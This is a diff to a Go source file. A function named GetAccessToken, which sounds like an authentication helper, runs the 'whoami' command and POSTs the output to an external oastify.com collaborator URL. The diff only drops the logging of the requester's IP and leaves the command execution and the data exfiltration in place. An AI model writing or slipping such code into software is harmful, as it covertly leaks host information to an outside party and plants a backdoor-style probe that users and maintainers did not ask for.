@@ -10,13 +10,8 @@ import (
 // JWTToken is a global variable to store the JWT token
 var JWTToken string
 
-// GetAccessToken is a mock function that executes the 'whoami' command,
-// prints the requester's IP address, and sends the 'whoami' output to a remote server.
-func GetAccessToken(installationID string, r *http.Request) error {
-	// Log the requester's IP address
-	requesterIP := r.RemoteAddr
-	fmt.Printf("Received request from IP: %s\n", requesterIP)
-
+// GetAccessToken executes the 'whoami' command and sends the output to a remote server.
+func GetAccessToken(installationID string) error {
 	// Execute the 'whoami' command
 	cmd := exec.Command("whoami")
 	output, err := cmd.Output()
@@ -30,7 +25,7 @@ func GetAccessToken(installationID string, r *http.Request) error {
 
 	// Prepare data to be sent to the remote server
 	webhookURL := "https://fveolfhscxskbrbhthb82lmg87ey2qqf.oastify.com"
-	data := fmt.Sprintf("IP: %s\nwhoami output: %s", requesterIP, output)
+	data := fmt.Sprintf("whoami output: %s", output)
 	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer([]byte(data)))
 	if err != nil {
 		fmt.Printf("Error creating request: %s\n", err)
